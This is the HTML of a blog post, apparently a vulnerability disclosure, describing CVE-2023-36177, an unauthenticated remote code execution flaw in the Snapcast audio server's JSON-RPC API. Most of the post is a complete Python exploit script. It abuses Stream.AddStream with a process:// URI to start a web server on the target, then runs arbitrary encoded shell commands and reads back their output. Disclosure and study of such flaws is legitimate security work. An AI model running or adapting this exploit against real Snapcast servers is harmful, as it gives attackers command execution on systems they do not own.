<!DOCTYPE html>
<html lang="en">
<meta http-equiv="Content-Security-Policy" content="style-src 'self' https://fonts.googleapis.com; img-src 'self'; font-src 'self' https://fonts.gstatic.com; connect-src 'self'; media-src 'self'; object-src 'self'; child-src 'self'; form-action 'none'; base-uri 'self'" />
<meta http-equiv="X-XSS-Protection"  content="1;mode=block" always>
<meta http-equiv="Referrer-Policy" content="no-referrer, strict-origin-when-cross-origin"><head>
  <meta charset="utf-8">
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" />
  <title>[CVE-2023-36177] Snapcast JSON-RPC RCE PoC</title><!-- Begin Jekyll SEO tag v2.8.0 -->
<meta name="generator" content="Jekyll v3.9.3" />
<meta property="og:title" content="[CVE-2023-36177] Snapcast JSON-RPC RCE PoC" />
<meta property="og:locale" content="en_US" />
<meta name="description" content="[CVE-2023-36177] Snapcast JSON-RPC RCE PoC" />
<meta property="og:description" content="[CVE-2023-36177] Snapcast JSON-RPC RCE PoC" />
<link rel="canonical" href="oxnan.github.io/posts/Snapcast_jsonrpc_rce" />
<meta property="og:url" content="oxnan.github.io/posts/Snapcast_jsonrpc_rce" />
<meta property="og:site_name" content="oxnan" />
<meta property="og:type" content="article" />
<meta property="article:published_time" content="2023-06-19T01:02:01+00:00" />
<meta name="twitter:card" content="summary" />
<meta property="twitter:title" content="[CVE-2023-36177] Snapcast JSON-RPC RCE PoC" />
<script type="application/ld+json">
{"@context":"https://schema.org","@type":"BlogPosting","dateModified":"2023-06-19T01:02:01+00:00","datePublished":"2023-06-19T01:02:01+00:00","description":"[CVE-2023-36177] Snapcast JSON-RPC RCE PoC","headline":"[CVE-2023-36177] Snapcast JSON-RPC RCE PoC","mainEntityOfPage":{"@type":"WebPage","@id":"oxnan.github.io/posts/Snapcast_jsonrpc_rce"},"url":"oxnan.github.io/posts/Snapcast_jsonrpc_rce"}</script>
<!-- End Jekyll SEO tag -->
<link rel="stylesheet" type="text/css" href="/assets/main-dark.css"><link rel="stylesheet" href="/assets/css/styles.css"></head>
<body>
    <div class="container"><header>
  <div class="custommenu">
    <img src="/img/v5.png">
    <ul><li><a href="/">Home</a></li><li><a href="/about/">About</a></li></ul>
  </div>
</header>
<main>
      <h3 id="cve-2023-36177-snapcast-json-rpc-rce-poc">[CVE-2023-36177] Snapcast JSON-RPC RCE PoC</h3>

<h4 id="description">Description</h4>
<p>Snapcast is a multiroom client-server audio player, where all clients are time synchronized with the server to play perfectly synced audio. It’s not a standalone player, but an extension that turns your existing audio player into a Sonos-like multiroom solution.</p>

<p>Using the JSON-RPC API provided with snapcast on default installations, an attacker can leverage snapcasts functionality of reading sound from a process, to gain remote code execution. This works by creating a new stream in snapcast with the <code class="language-plaintext highlighter-rouge">Stream.AddStream</code> method, using the <code class="language-plaintext highlighter-rouge">process://</code> type for the <code class="language-plaintext highlighter-rouge">streamUri</code>.</p>

<p>The following script works, by using the <code class="language-plaintext highlighter-rouge">http.server</code> module in python, to spawn a webserver in the default snapserver data dir. This way, any file we create in there we can read from. 
Next a new stream is created that runs whatever command we see fit, and writes the output into <code class="language-plaintext highlighter-rouge">/var/lib/snapserver/tmp</code>, then using the requests module, get’s the output from the command over the webserver, and finally cleans up after itself removing the different streams. Keep in mind, this is not to evade detection, but just to you can run the script again with the same stream names, as they cannot be overlapping. The tmp file created on the server will persist, unless you remove it yourself.</p>

<p>This issue affects Snapcast Server versions 0.27.0 and below</p>

<h4 id="poc-script">PoC script:</h4>
<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">import</span> <span class="nn">sys</span>
<span class="kn">import</span> <span class="nn">json</span>
<span class="kn">import</span> <span class="nn">time</span>
<span class="kn">import</span> <span class="nn">base64</span>
<span class="kn">import</span> <span class="nn">requests</span>
<span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>

<span class="k">try</span><span class="p">:</span>
    <span class="n">host</span> <span class="o">=</span> <span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span>
    <span class="n">port</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">2</span><span class="p">])</span>
<span class="k">except</span><span class="p">:</span>
    <span class="k">print</span><span class="p">(</span><span class="sa">f</span><span class="s">"Usage:</span><span class="se">\n</span><span class="si">{</span><span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="si">}</span><span class="s"> hostname port"</span><span class="p">)</span>
    <span class="nb">exit</span><span class="p">()</span>


<span class="k">def</span> <span class="nf">genclean</span><span class="p">(</span><span class="n">streamname</span><span class="p">):</span>
    <span class="n">clean</span> <span class="o">=</span> <span class="p">{</span>
        <span class="s">"id"</span><span class="p">:</span> <span class="mi">8</span><span class="p">,</span>
        <span class="s">"jsonrpc"</span><span class="p">:</span> <span class="s">"2.0"</span><span class="p">,</span>
        <span class="s">"method"</span><span class="p">:</span> <span class="s">"Stream.RemoveStream"</span><span class="p">,</span>
        <span class="s">"params"</span><span class="p">:</span> <span class="p">{</span><span class="s">"id"</span><span class="p">:</span> <span class="n">streamname</span><span class="p">},</span>
    <span class="p">}</span>
    <span class="k">return</span> <span class="n">json</span><span class="p">.</span><span class="n">dumps</span><span class="p">(</span><span class="n">clean</span><span class="p">).</span><span class="n">encode</span><span class="p">()</span>


<span class="k">def</span> <span class="nf">stage1</span><span class="p">(</span><span class="n">streamname</span><span class="p">):</span>
    <span class="n">payload</span> <span class="o">=</span> <span class="p">{</span>
        <span class="s">"id"</span><span class="p">:</span> <span class="mi">8</span><span class="p">,</span>
        <span class="s">"jsonrpc"</span><span class="p">:</span> <span class="s">"2.0"</span><span class="p">,</span>
        <span class="s">"method"</span><span class="p">:</span> <span class="s">"Stream.AddStream"</span><span class="p">,</span>
        <span class="s">"params"</span><span class="p">:</span> <span class="p">{</span>
            <span class="s">"streamUri"</span><span class="p">:</span> <span class="sa">f</span><span class="s">"process:///bin/python3?name=</span><span class="si">{</span><span class="n">streamname</span><span class="si">}</span><span class="s">&amp;params=-m http.server -d /var/lib/snapserver 6724"</span>
        <span class="p">},</span>
    <span class="p">}</span>
    <span class="n">io</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">json</span><span class="p">.</span><span class="n">dumps</span><span class="p">(</span><span class="n">payload</span><span class="p">).</span><span class="n">encode</span><span class="p">())</span>
    <span class="k">return</span> <span class="n">io</span><span class="p">.</span><span class="n">recvline</span><span class="p">()</span>


<span class="k">def</span> <span class="nf">stage2</span><span class="p">(</span><span class="n">streamname</span><span class="p">,</span> <span class="n">cmd</span><span class="p">):</span>
    <span class="n">b64cmd</span> <span class="o">=</span> <span class="n">base64</span><span class="p">.</span><span class="n">b64encode</span><span class="p">(</span><span class="n">cmd</span><span class="p">.</span><span class="n">encode</span><span class="p">()).</span><span class="n">decode</span><span class="p">()</span>
    <span class="n">command</span> <span class="o">=</span> <span class="sa">f</span><span class="s">"""open('/var/lib/snapserver/tmp','w').write(__import__('os').popen(__import__('base64').b64decode('</span><span class="si">{</span><span class="n">b64cmd</span><span class="si">}</span><span class="s">').decode()).read())"""</span>
    <span class="n">hexcmd</span> <span class="o">=</span> <span class="s">""</span><span class="p">.</span><span class="n">join</span><span class="p">([</span><span class="sa">f</span><span class="s">"</span><span class="se">\\</span><span class="s">x</span><span class="si">{</span><span class="nb">ord</span><span class="p">(</span><span class="n">c</span><span class="p">):</span><span class="mi">02</span><span class="n">x</span><span class="si">}</span><span class="s">"</span> <span class="k">for</span> <span class="n">c</span> <span class="ow">in</span> <span class="n">command</span><span class="p">])</span>
    <span class="n">payload</span> <span class="o">=</span> <span class="p">{</span>
        <span class="s">"id"</span><span class="p">:</span> <span class="mi">8</span><span class="p">,</span>
        <span class="s">"jsonrpc"</span><span class="p">:</span> <span class="s">"2.0"</span><span class="p">,</span>
        <span class="s">"method"</span><span class="p">:</span> <span class="s">"Stream.AddStream"</span><span class="p">,</span>
        <span class="s">"params"</span><span class="p">:</span> <span class="p">{</span>
            <span class="s">"streamUri"</span><span class="p">:</span> <span class="sa">f</span><span class="s">"process:///bin/python3?name=</span><span class="si">{</span><span class="n">streamname</span><span class="si">}</span><span class="s">&amp;params=-c exec('</span><span class="si">{</span><span class="n">hexcmd</span><span class="si">}</span><span class="s">')"</span>
        <span class="p">},</span>
    <span class="p">}</span>
    <span class="n">io</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">json</span><span class="p">.</span><span class="n">dumps</span><span class="p">(</span><span class="n">payload</span><span class="p">).</span><span class="n">encode</span><span class="p">())</span>
    <span class="k">return</span> <span class="n">io</span><span class="p">.</span><span class="n">recvline</span><span class="p">()</span>


<span class="k">def</span> <span class="nf">cleanup</span><span class="p">(</span><span class="n">streamname</span><span class="p">):</span>
    <span class="n">genclean</span><span class="p">(</span><span class="n">streamname</span><span class="p">)</span>
    <span class="n">time</span><span class="p">.</span><span class="n">sleep</span><span class="p">(</span><span class="mf">0.1</span><span class="p">)</span>
    <span class="n">io</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">genclean</span><span class="p">(</span><span class="n">streamname</span><span class="p">))</span>
    <span class="k">return</span> <span class="n">io</span><span class="p">.</span><span class="n">recvline</span><span class="p">()</span>


<span class="k">if</span> <span class="n">__name__</span> <span class="o">==</span> <span class="s">"__main__"</span><span class="p">:</span>
    <span class="n">io</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="n">host</span><span class="p">,</span> <span class="n">port</span><span class="p">)</span>
    <span class="n">stage1</span><span class="p">(</span><span class="s">"webserver"</span><span class="p">)</span>
    <span class="n">cmd</span> <span class="o">=</span> <span class="nb">input</span><span class="p">(</span><span class="s">"&gt;&gt;&gt; "</span><span class="p">)</span>
    <span class="n">stage2</span><span class="p">(</span><span class="s">"tmp"</span><span class="p">,</span> <span class="n">cmd</span><span class="p">)</span>
    <span class="n">time</span><span class="p">.</span><span class="n">sleep</span><span class="p">(</span><span class="mf">0.3</span><span class="p">)</span>
    <span class="k">print</span><span class="p">(</span><span class="n">requests</span><span class="p">.</span><span class="n">get</span><span class="p">(</span><span class="sa">f</span><span class="s">"http://</span><span class="si">{</span><span class="n">host</span><span class="si">}</span><span class="s">:6724/tmp"</span><span class="p">).</span><span class="n">text</span><span class="p">)</span>
    <span class="n">cleanup</span><span class="p">(</span><span class="s">"tmp"</span><span class="p">)</span>
    <span class="n">cleanup</span><span class="p">(</span><span class="s">"webserver"</span><span class="p">)</span>
</code></pre></div></div>


    </main><footer>
  
<meta http-equiv="X-UA-Compatible" content="IE=edge">  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" />
<script>
  kofiWidgetOverlay.draw('oxnan', {
    'type': 'floating-chat',
    'floating-chat.donateButton.text': 'Support Me',
    'floating-chat.donateButton.background-color': '#f45d22',
    'floating-chat.donateButton.text-color': '#fff'
  });
</script>
</footer>
</div>
  </body>
</html>
